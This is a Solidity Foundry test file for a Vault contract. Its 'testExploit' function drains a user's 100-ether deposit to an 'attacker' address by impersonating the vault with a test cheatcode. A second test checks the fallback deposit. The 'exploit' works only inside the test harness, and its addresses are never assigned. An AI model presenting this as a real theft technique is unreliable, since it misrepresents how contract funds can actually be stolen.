//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "src/Vault.sol";

contract exploitVault is Test{

    Vault vault;
    address someUser;
    address attacker;
    uint balanceBefore;

    function setUp() public {
        vault = new Vault();

        vm.label(someUser, "someUser");
        vm.deal(someUser, 100 ether);

        vm.label(address(vault), "VAULT CONTRACT");

        balanceBefore = address(vault).balance;
        emit log_uint(balanceBefore);
    }

    //Trying to steal the the funds in the contract
    function testExploit() public {
        vm.startPrank(someUser);
        vault.deposit{value: 100 ether}();
        emit log_named_uint("Some User has a remaining balance of ", someUser.balance);
        vm.stopPrank();

        //EXPLOIT BEGINS HERE...
        vm.startPrank(address(vault));
        payable(attacker).transfer(address(vault).balance);
        vm.stopPrank();

        assertEq(attacker.balance, 100 ether);
        assertEq(address(vault).balance, 0);
    }

    //used this exploit to better the fallback 
    //function in the original contract.....
    function testAnotherExploit() public {
        vm.startPrank(someUser);

        (bool success, ) = address(vault).call{value: 1 ether} ("");
        if(success) assertEq(someUser.balance, 99 ether);
        assertEq(address(vault).balance, 1 ether);
        assertEq(vault.balances(someUser), 1 ether);

        emit log_uint(vault.balances(someUser));
    }
}